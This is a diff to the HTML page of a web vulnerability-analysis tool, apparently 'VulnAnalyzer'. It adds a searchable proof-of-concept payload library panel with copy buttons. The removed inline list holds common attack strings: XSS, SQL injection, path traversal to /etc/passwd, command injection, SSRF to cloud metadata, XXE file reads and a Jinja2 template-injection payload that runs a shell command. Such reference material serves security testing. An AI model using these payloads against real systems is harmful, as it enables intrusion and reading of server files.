@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>VulnAnalyzer</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<script src="/static/poc_data.js"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 :root {
@@ -486,6 +487,139 @@ body {
 .scan-stats.active { display: flex; }
 .stat-item { display: flex; gap: 4px; align-items: center; }
 .stat-value { color: var(--text); font-weight: 600; }
+/* PoC library panel */
+.poc-area {
+  flex: 1;
+  overflow: hidden;
+  display: none;
+  flex-direction: column;
+}
+.poc-area.active { display: flex; }
+.poc-toolbar {
+  display: flex;
+  gap: 8px;
+  padding: 10px 12px;
+  border-bottom: 1px solid var(--border);
+  align-items: center;
+}
+.poc-categories {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 4px;
+  padding: 8px 12px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg);
+  max-height: 90px;
+  overflow-y: auto;
+}
+.poc-cat-btn {
+  padding: 3px 10px;
+  border: 1px solid var(--border);
+  background: transparent;
+  color: var(--muted);
+  cursor: pointer;
+  border-radius: 3px;
+  font-size: 10px;
+  font-family: 'JetBrains Mono', monospace;
+  transition: all 0.15s;
+  white-space: nowrap;
+}
+.poc-cat-btn:hover { color: var(--text); border-color: var(--muted); }
+.poc-cat-btn.active {
+  color: var(--text);
+  border-color: var(--accent);
+  background: rgba(57,211,83,0.08);
+}
+.poc-cat-btn .cat-count {
+  color: var(--muted);
+  font-size: 9px;
+  margin-left: 3px;
+}
+.poc-content {
+  flex: 1;
+  overflow-y: auto;
+  padding: 8px 12px;
+}
+.poc-content::-webkit-scrollbar { width: 5px; }
+.poc-content::-webkit-scrollbar-track { background: transparent; }
+.poc-content::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+/* PoC category section in content */
+.poc-section {
+  margin-bottom: 6px;
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  overflow: hidden;
+  background: var(--surface);
+}
+.poc-section-header {
+  padding: 8px 12px;
+  background: var(--surface2);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 11px;
+  font-weight: 600;
+  user-select: none;
+  transition: background 0.1s;
+  border-bottom: 1px solid var(--border);
+}
+.poc-section-header:hover { background: var(--border); }
+.poc-section-header .chevron {
+  font-size: 8px;
+  transition: transform 0.2s;
+}
+.poc-section.open .poc-section-header .chevron { transform: rotate(90deg); }
+.poc-section-body {
+  display: none;
+  padding: 6px 8px;
+}
+.poc-section.open .poc-section-body { display: block; }
+.poc-item {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 5px 8px;
+  border-radius: 3px;
+  font-size: 11px;
+  font-family: 'JetBrains Mono', monospace;
+  transition: background 0.1s;
+}
+.poc-item:hover { background: var(--surface2); }
+.poc-item-label {
+  color: var(--muted);
+  min-width: 70px;
+  font-size: 9px;
+  text-transform: uppercase;
+  letter-spacing: 0.3px;
+  flex-shrink: 0;
+}
+.poc-item-payload {
+  flex: 1;
+  color: var(--text);
+  word-break: break-all;
+  font-size: 10px;
+  line-height: 1.5;
+  background: var(--bg);
+  padding: 3px 6px;
+  border-radius: 2px;
+  border: 1px solid var(--border);
+  overflow-x: auto;
+  white-space: pre-wrap;
+}
+.poc-copy-btn {
+  flex-shrink: 0;
+  padding: 2px 8px;
+  border: 1px solid var(--border);
+  background: transparent;
+  color: var(--muted);
+  cursor: pointer;
+  border-radius: 3px;
+  font-size: 10px;
+  transition: all 0.15s;
+}
+.poc-copy-btn:hover { color: var(--accent); border-color: var(--accent); }
+.poc-copy-btn.copied { color: var(--accent); border-color: var(--accent); background: rgba(57,211,83,0.1); }
 </style>
 </head>
 <body>
@@ -493,8 +627,9 @@ body {
   <div class="header">
     <div class="logo">Vuln<span>Analyzer</span></div>
     <div class="header-sep"></div>
-    <button class="mode-btn active" onclick="switchMode('manual')">Manual</button>
+    <button class="mode-btn" onclick="switchMode('manual')">Manual</button>
     <button class="mode-btn" onclick="switchMode('scan')">Scan</button>
+    <button class="mode-btn" onclick="switchMode('poc')">PoC</button>
   </div>
   <div class="left">
     <div class="input-area active">
@@ -539,6 +674,19 @@ body {
       </div>
       <div class="scan-log" id="scan-log"></div>
     </div>
+    <div class="poc-area">
+      <div class="poc-toolbar">
+        <input type="text" id="poc-search" class="form-input" placeholder="Search payloads..." style="flex:1;height:30px;font-size:11px;">
+        <span id="poc-count" style="color:var(--muted);font-size:10px;white-space:nowrap;">0 payloads</span>
+      </div>
+      <div class="poc-categories" id="poc-categories"></div>
+      <div class="poc-content" id="poc-content">
+        <div class="empty-state">
+          <div class="icon">⚗</div>
+          <p>Select a category to view payloads</p>
+        </div>
+      </div>
+    </div>
   </div>
   <div class="right">
     <div class="results-header" id="results-header"></div>
@@ -557,51 +705,6 @@ body {
 </div>
 
 <script>
-const POC = {
-  "XSS": [
-    ["Reflected", "<img src=x onerror=alert(1)>"],
-    ["DOM-based", "\" onmouseover=\"alert(1)\" x=\""],
-    ["Stored", "<scr" + "ipt>alert(document.cookie)<\/scr" + "ipt>"]
-  ],
-  "SQL Injection": [
-    ["Boolean", "' OR '1'='1"],
-    ["UNION", "' UNION SELECT 1,2,3,4-- -"],
-    ["Time-based", "' AND SLEEP(5)-- -"]
-  ],
-  "Path Traversal": [
-    ["Unix", "../../../etc/passwd"],
-    ["Windows", "..\\\\..\\\\..\\\\windows\\\\win.ini"],
-    ["Encoded", "..%2F..%2F..%2Fetc%2Fpasswd"]
-  ],
-  "Cmd Injection": [
-    ["Basic", "; id; "],
-    ["Pipe", "| cat /etc/passwd"]
-  ],
-  "SSRF": [
-    ["Localhost", "http://127.0.0.1:8080"],
-    ["Cloud Meta", "http://169.254.169.254/latest/meta-data/"]
-  ],
-  "Open Redirect": [
-    ["Protocol", "//attacker.com"],
-    ["JS", "javascript:alert(1)"]
-  ],
-  "XXE": [
-    ["Basic", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"]
-  ],
-  "Insecure Deserialization": [
-    ["Java", "ObjectInputStream.readObject() with untrusted data"]
-  ],
-  "SSTI": [
-    ["Jinja2", "{{7*7}}"],
-    ["Jinja2 RCE", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"],
-    ["Twig", "{{7*'7'}}"],
-    ["Freemarker", "${7*7}"],
-    ["Velocity", "#set($x=7*7)$x"],
-    ["Thymeleaf", "[[7*7]]"],
-    ["Smarty", "{7*7}"],
-  ],
-};
-
 let currentFindings = [];
 let activeFilter = 'all';
 
@@ -610,11 +713,16 @@ function switchMode(mode) {
   if (event && event.target) event.target.classList.add('active');
   const input = document.querySelector('.input-area');
   const scan = document.querySelector('.scan-area');
+  const poc = document.querySelector('.poc-area');
+  input.classList.remove('active');
+  scan.classList.remove('active');
+  poc.classList.remove('active');
   if (mode === 'manual') {
     input.classList.add('active');
-    scan.classList.remove('active');
+  } else if (mode === 'poc') {
+    poc.classList.add('active');
+    renderPocLibrary();
   } else {
-    input.classList.remove('active');
     scan.classList.add('active');
   }
 }
@@ -858,6 +966,156 @@ document.addEventListener('keydown', (e) => {
     else analyze();
   }
 });
+
+// =====================================================================
+// PoC Library
+// =====================================================================
+let pocActiveCategory = 'all';
+
+function renderPocLibrary() {
+  renderPocCategoryButtons();
+  const searchTerm = (document.getElementById('poc-search').value || '').trim().toLowerCase();
+  renderPocContent(pocActiveCategory, searchTerm);
+}
+
+function renderPocCategoryButtons() {
+  const container = document.getElementById('poc-categories');
+  let html = `<button class="poc-cat-btn ${pocActiveCategory === 'all' ? 'active' : ''}" onclick="filterPocCategory('all')">All <span class="cat-count">(${Object.keys(POC_DATA).length})</span></button>`;
+  const meta = POC_META;
+  for (const [catName, catData] of Object.entries(POC_DATA)) {
+    const isActive = pocActiveCategory === catName;
+    const riskClass = (meta[catName] || {}).risk || '';
+    html += `<button class="poc-cat-btn ${isActive ? 'active' : ''}" onclick="filterPocCategory('${catName.replace(/'/g, "\\'")}')">${escape(catName)} <span class="cat-count">(${catData.length})</span></button>`;
+  }
+  container.innerHTML = html;
+}
+
+function filterPocCategory(category) {
+  pocActiveCategory = category;
+  renderPocCategoryButtons();
+  const searchTerm = (document.getElementById('poc-search').value || '').trim().toLowerCase();
+  renderPocContent(category, searchTerm);
+}
+
+// Search on input
+document.getElementById('poc-search').addEventListener('input', function() {
+  const searchTerm = this.value.trim().toLowerCase();
+  renderPocContent(pocActiveCategory, searchTerm);
+});
+
+function renderPocContent(category, searchTerm) {
+  const container = document.getElementById('poc-content');
+  const countEl = document.getElementById('poc-count');
+  let totalItems = 0;
+  let html = '';
+
+  if (category === 'all') {
+    // Show ALL categories
+    for (const [catName, items] of Object.entries(POC_DATA)) {
+      const filtered = searchTerm ? items.filter(i => i[0].toLowerCase().includes(searchTerm) || i[1].toLowerCase().includes(searchTerm)) : items;
+      if (filtered.length === 0 && searchTerm) continue;
+      totalItems += filtered.length;
+      html += renderCategorySection(catName, filtered, true);
+    }
+    if (!html) {
+      html = '<div class="empty-state"><div class="icon">\uD83D\uDD0D</div><p>No matching payloads found</p></div>';
+    }
+  } else {
+    // Show single category
+    const items = POC_DATA[category] || [];
+    const filtered = searchTerm ? items.filter(i => i[0].toLowerCase().includes(searchTerm) || i[1].toLowerCase().includes(searchTerm)) : items;
+    totalItems = filtered.length;
+    if (filtered.length === 0) {
+      html = '<div class="empty-state"><div class="icon">\uD83D\uDD0D</div><p>No matching payloads in this category</p></div>';
+    } else {
+      html = renderCategorySection(category, filtered, false);
+    }
+  }
+
+  countEl.textContent = totalItems + ' payload' + (totalItems !== 1 ? 's' : '');
+  container.innerHTML = html;
+}
+
+function renderCategorySection(catName, items, collapsible) {
+  const meta = POC_META[catName] || {};
+  const risk = meta.risk || 'info';
+  const cwe = meta.cwe || '';
+
+  // Build item elements using safe DOM API (no string concat of payloads)
+  const tmp = document.createElement('div');
+  for (const item of items) {
+    const label = item[0];
+    const payload = item[1];
+
+    const div = document.createElement('div');
+    div.className = 'poc-item';
+
+    const labelSpan = document.createElement('span');
+    labelSpan.className = 'poc-item-label';
+    labelSpan.textContent = label;
+
+    const payloadSpan = document.createElement('span');
+    payloadSpan.className = 'poc-item-payload';
+    payloadSpan.textContent = payload;
+
+    const copyBtn = document.createElement('button');
+    copyBtn.className = 'poc-copy-btn';
+    copyBtn.textContent = 'Copy';
+    copyBtn.dataset.payload = payload;  // setAttribute auto-escapes
+
+    div.appendChild(labelSpan);
+    div.appendChild(payloadSpan);
+    div.appendChild(copyBtn);
+    tmp.appendChild(div);
+  }
+  const itemsHtml = tmp.innerHTML;  // serialize — properly escaped
+
+  const headerHtml = `<div class="poc-section-header" onclick="this.parentElement.classList.toggle('open')">
+  <span class="chevron">\u25B6</span>
+  <span>${escape(catName)}</span>
+  <span class="risk-badge ${risk}" style="font-size:8px;padding:1px 6px;">${risk.toUpperCase()}</span>
+  ${cwe ? `<a href="https://cwe.mitre.org/data/definitions/${cwe.replace('CWE-', '')}.html" target="_blank" style="color:var(--muted);font-size:9px;margin-left:auto;text-decoration:none;">${cwe}</a>` : ''}
+  <span style="color:var(--muted);font-size:9px;">${items.length}</span>
+</div>`;
+
+  return `<div class="poc-section ${collapsible ? '' : 'open'}">
+  ${headerHtml}
+  <div class="poc-section-body">${itemsHtml}</div>
+</div>`;
+}
+
+// Delegated click for Copy buttons — avoids inline onclick + data-payload concat
+function setupPocCopyButtons() {
+  document.getElementById('poc-content').addEventListener('click', function(e) {
+    const btn = e.target.closest('.poc-copy-btn');
+    if (!btn) return;
+    const payload = btn.dataset.payload;
+    if (!payload) return;
+    navigator.clipboard.writeText(payload).then(() => {
+      btn.textContent = '\u2713';
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = 'Copy';
+        btn.classList.remove('copied');
+      }, 1500);
+    }).catch(() => {
+      // Fallback
+      const textarea = document.createElement('textarea');
+      textarea.value = payload;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textarea);
+      btn.textContent = '\u2713';
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = 'Copy';
+        btn.classList.remove('copied');
+      }, 1500);
+    });
+  });
+}
+setupPocCopyButtons();
 </script>
 </body>
 </html>
